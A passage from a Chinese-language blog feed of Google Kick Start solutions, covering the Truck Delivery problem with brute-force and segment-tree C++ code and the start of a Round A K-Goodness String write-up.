<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> num;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx;</span><br><span class="line">    vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; arr;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;num;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> x = <span class="built_in">sqrt</span>(num);</span><br><span class="line">    <span class="comment">/*upper*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = x+<span class="number">1</span>; i &lt; num ;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isPrime</span>(i))&#123;</span><br><span class="line">            arr.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*lower*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = x; i &gt;= <span class="number">2</span>; --i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isPrime</span>(i))&#123;</span><br><span class="line">            arr.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="keyword">if</span>(arr.<span class="built_in">size</span>() &gt;= <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="number">0</span>]*arr[<span class="number">1</span>] &lt;= num)&#123;</span><br><span class="line">        ans = <span class="built_in">max</span>(ans,arr[<span class="number">0</span>]*arr[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="number">1</span>]*arr[<span class="number">2</span>] &lt;= num)&#123;</span><br><span class="line">        ans = <span class="built_in">max</span>(ans,arr[<span class="number">1</span>]*arr[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*find all prime*/</span></span><br><span class="line">    <span class="built_in">memset</span>(visit,<span class="number">0</span>,<span class="built_in">sizeof</span>(visit));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>;i &lt;= <span class="number">100005</span>; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visit[i]) <span class="keyword">continue</span>;</span><br><span class="line">        prime.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i; j &lt;= <span class="number">100005</span>; j = j + i)&#123;</span><br><span class="line">            visit[j] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Truck-Delivery"><a href="#Truck-Delivery" class="headerlink" title="Truck Delivery"></a>Truck Delivery</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/04/21/TbHgtyqCvL2SI7M.png"></p>
<h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435a5b/000000000077a885#problem">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435a5b/000000000077a885#problem</a></p>
<h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>线段树</p>
</blockquote>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>对于<code>test1</code>的数据集感觉一般人都能拿到分，无非是每次遇到查询，进行暴力检测路劲即可，即可得到所有可能的$GCD$的值，这个13分感觉很好难，时间复杂度为$O(N*Q)$.</li>
<li>对于第二个测试集则需要进行深入思考的深度，仔细发现一下，如果我们采用<code>dfs</code>遍历每一条路径时，如果所经历的路径已经按照<code>limit</code>进行排序好了，则我们可以很容易的利用二分查找即可在$O(lg(MAX(L)))$的时间复杂度内完成一次查询，如果需要这样进行查询的话则我们需要构造一种数据结构在$O(lg(MAX(L)))$的时间复杂度内完成这个查询。仔细思索一下我们可以构造线段树，线段树的长度为$(1,MAX(L))$,线段树的<code>key</code>为$L_{i}$,值为$V_{i}$,初始时设置$V_{i} &#x3D; 0$.每次遇到查询$(C_{i},W_{i})$时，我们只需要查询$(1,W_{i})$范围的$gcd$即可。我们在遍历到某个节点时，则我们需要对线段树进行更新，每次更新$(L_{i},gcd(V_{i},C_{i}))$，每当我们从第$i$个节点退出时，则我们需要更新线段树的节点，需要将其节点的值从$gcd(V_{i},C_{i})$恢复到$V_{i}$.</li>
<li>时间复杂度为$O((2*N+Q)*lg(MAX(L)))$,空间复杂度为$O(MAX(L))$.</li>
</ol>
<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><ul>
<li>暴力解法<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">long</span> <span class="type">long</span>,<span class="type">long</span> <span class="type">long</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,q;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">    vector&lt;vector&lt;pii&gt;&gt; <span class="built_in">edgs</span>(n,<span class="built_in">vector</span>&lt;pii&gt;(n));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; ++i)&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> x,y,l,a;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;l&gt;&gt;a;</span><br><span class="line">        x--;</span><br><span class="line">        y--;</span><br><span class="line">        graph[x].<span class="built_in">push_back</span>(y);</span><br><span class="line">        graph[y].<span class="built_in">push_back</span>(x);</span><br><span class="line">        edgs[x][y] = &#123;l,a&#125;;</span><br><span class="line">        edgs[y][x] = &#123;l,a&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; fa = <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n)</span></span>;</span><br><span class="line">    queue&lt;<span class="type">long</span> <span class="type">long</span>&gt; qu;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*bfs*/</span></span><br><span class="line">    qu.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    visit[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="type">int</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">        qu.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*neg*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : graph[curr])&#123;</span><br><span class="line">            <span class="keyword">if</span>(visit[v]) <span class="keyword">continue</span>;</span><br><span class="line">            visit[v] = <span class="literal">true</span>;</span><br><span class="line">            fa[v] = curr;</span><br><span class="line">            qu.<span class="built_in">push</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; q; ++i)&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> c,w;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">        cin&gt;&gt;c&gt;&gt;w;</span><br><span class="line">        c--;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(c != <span class="number">0</span>)&#123;</span><br><span class="line">            pii curr = edgs[c][fa[c]];</span><br><span class="line">            <span class="keyword">if</span>(w &gt;= curr.first)&#123;</span><br><span class="line">                <span class="keyword">if</span>(num == <span class="number">0</span>) num = curr.second;</span><br><span class="line">                <span class="keyword">else</span> num = __gcd(num,curr.second);</span><br><span class="line">            &#125;</span><br><span class="line">            c = fa[c];</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout&lt;&lt;num&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>线段树解法<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">long</span> <span class="type">long</span>,<span class="type">long</span> <span class="type">long</span>&gt; pll;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> int64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> int32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegTreeNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; gcd;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">    <span class="type">int</span> city;</span><br><span class="line">    <span class="type">int</span> limit;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> charge;</span><br><span class="line">    <span class="built_in">Edge</span>(<span class="type">int</span> city,<span class="type">int</span> limit,<span class="type">long</span> <span class="type">long</span> charge)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;city = city;</span><br><span class="line">        <span class="keyword">this</span>-&gt;limit = limit;</span><br><span class="line">        <span class="keyword">this</span>-&gt;charge = charge;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">long</span> <span class="type">long</span> MAXN = <span class="number">200005</span>;</span><br><span class="line">SegTreeNode tree[MAXN*<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHL(x) (x*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHR(x) (x*2 + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">pushUpTree</span><span class="params">(<span class="type">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> left = tree[<span class="built_in">CHL</span>(idx)].gcd.<span class="built_in">back</span>();</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> right = tree[<span class="built_in">CHR</span>(idx)].gcd.<span class="built_in">back</span>();</span><br><span class="line">    tree[idx].gcd[<span class="number">0</span>] = __gcd(left,right);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">buildTree</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    tree[idx].l = l;</span><br><span class="line">    tree[idx].r = r;</span><br><span class="line">    tree[idx].gcd.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(l == r)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">buildTree</span>(l,mid,<span class="built_in">CHL</span>(idx));</span><br><span class="line">    <span class="built_in">buildTree</span>(mid+<span class="number">1</span>,r,<span class="built_in">CHR</span>(idx));</span><br><span class="line">    <span class="built_in">pushUpTree</span>(idx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">updateTree</span><span class="params">(<span class="type">int</span> idx,<span class="type">int</span> x,<span class="type">long</span> <span class="type">long</span> charge,<span class="type">int</span> add)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &lt; tree[idx].l || x &gt; tree[idx].r ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(tree[idx].l == tree[idx].r &amp;&amp; tree[idx].l == x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(add == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">//向当前节点加入一个新值</span></span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> val = tree[idx].gcd.<span class="built_in">back</span>();</span><br><span class="line">            tree[idx].gcd.<span class="built_in">push_back</span>(__gcd(val,charge));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(add == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="comment">//弹出最后一个值</span></span><br><span class="line">            tree[idx].gcd.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> mid = (tree[idx].l + tree[idx].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(x &lt;= mid)&#123;</span><br><span class="line">        <span class="built_in">updateTree</span>(<span class="built_in">CHL</span>(idx),x,charge,add);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">updateTree</span>(<span class="built_in">CHR</span>(idx),x,charge,add);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">pushUpTree</span>(idx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">queryTree</span><span class="params">(<span class="type">int</span> idx,<span class="type">int</span> w)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(w &lt; tree[idx].l) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(tree[idx].l == tree[idx].r &amp;&amp; tree[idx].r &lt;= w)&#123;</span><br><span class="line">        <span class="keyword">return</span> tree[idx].gcd.<span class="built_in">back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(w &gt;= tree[idx].r)&#123;</span><br><span class="line">        <span class="keyword">return</span> tree[idx].gcd.<span class="built_in">back</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> mid = (tree[idx].l + tree[idx].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(w &lt;= mid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">queryTree</span>(<span class="built_in">CHL</span>(idx),w);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(w &gt; mid)&#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> left = <span class="built_in">queryTree</span>(<span class="built_in">CHL</span>(idx),w);</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> right = <span class="built_in">queryTree</span>(<span class="built_in">CHR</span>(idx),w);</span><br><span class="line">            <span class="keyword">return</span> __gcd(left,right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> curr, vector&lt;<span class="type">bool</span>&gt; &amp; visit,vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; &amp; res,vector&lt;vector&lt;Edge&gt;&gt; &amp; graph,vector&lt;vector&lt;pii&gt;&gt; &amp; query)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; graph[curr].<span class="built_in">size</span>(); ++i)&#123;</span><br><span class="line">        <span class="type">int</span> nx = graph[curr][i].city;</span><br><span class="line">        <span class="type">int</span> limit = graph[curr][i].limit;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> charge = graph[curr][i].charge;</span><br><span class="line">        <span class="keyword">if</span>(visit[nx]) <span class="keyword">continue</span>;</span><br><span class="line">        visit[nx] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//更新当前的（L,C）</span></span><br><span class="line">        <span class="built_in">updateTree</span>(<span class="number">1</span>,limit,charge,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : query[nx])&#123;</span><br><span class="line">            <span class="type">int</span> weight = v.first;</span><br><span class="line">            <span class="type">int</span> idx = v.second;</span><br><span class="line">            res[idx] = <span class="built_in">queryTree</span>(<span class="number">1</span>,weight);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dfs</span>(nx,visit,res,graph,query);</span><br><span class="line">        <span class="comment">//删除当前的边</span></span><br><span class="line">        <span class="built_in">updateTree</span>(<span class="number">1</span>,limit,charge,<span class="number">-1</span>);</span><br><span class="line">        visit[nx] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,q;    </span><br><span class="line">    <span class="comment">/*input the value*/</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    vector&lt;vector&lt;Edge&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">    vector&lt;vector&lt;pii&gt;&gt; <span class="built_in">query</span>(n);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n,<span class="literal">false</span>)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">ans</span><span class="params">(q)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; ++i)&#123;</span><br><span class="line">        int64 x,y,l,a;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;l&gt;&gt;a;</span><br><span class="line">        x--;</span><br><span class="line">        y--;</span><br><span class="line">        graph[x].<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(y,l,a));</span><br><span class="line">        graph[y].<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(x,l,a));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; q; ++i)&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> c,w;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">        cin&gt;&gt;c&gt;&gt;w;</span><br><span class="line">        c--;</span><br><span class="line">        <span class="comment">//按照城市将所有的查询进行分类</span></span><br><span class="line">        query[c].<span class="built_in">push_back</span>(&#123;w,i&#125;);     </span><br><span class="line">    &#125;</span><br><span class="line">    visit[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*dfs every node*/</span></span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>,visit,ans,graph,query);</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; q; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    <span class="built_in">buildTree</span>(<span class="number">0</span>,<span class="number">200001</span>,<span class="number">1</span>);</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>kickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>【kick start】 2021 google kick start roundA</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/72/</url>
    <content><![CDATA[<h1 id="2021-google-kick-start-roundA"><a href="#2021-google-kick-start-roundA" class="headerlink" title="2021 google kick start roundA"></a>2021 google kick start roundA</h1><p><code>kick start</code>的题目果真质量非常高，非常值得学习和练习的题目，非常喜欢这类的题目，前三题都可以做出来，不过题目<code>D</code>确实很难，我感觉自己肯定想不到解答的答案的。前三题就是<code>leetcode</code>的难度，最后一题确实很难。</p>
<h2 id="K-Goodness-String-5pts-7pts"><a href="#K-Goodness-String-5pts-7pts" class="headerlink" title="K-Goodness String (5pts, 7pts)"></a>K-Goodness String (5pts, 7pts)</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/03/26/ERxJvVkZF1rYitD.png"><br>给定字符串，求出给定分值得最小变换次数</p>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000436140/000000000068cca3">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000436140/000000000068cca3</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  简单题目</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>我们只需要求出$s[i] !&#x3D; s[n-1-i]$得字符对个数，最小的变换次数等于不同的字符对的个数与<code>k</code>的绝对值之差。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> good = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> bad = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    string str;</span><br><span class="line">    <span class="type">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    cin&gt;&gt;str;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; (n&gt;&gt;<span class="number">1</span>); ++i)&#123;</span><br><span class="line">        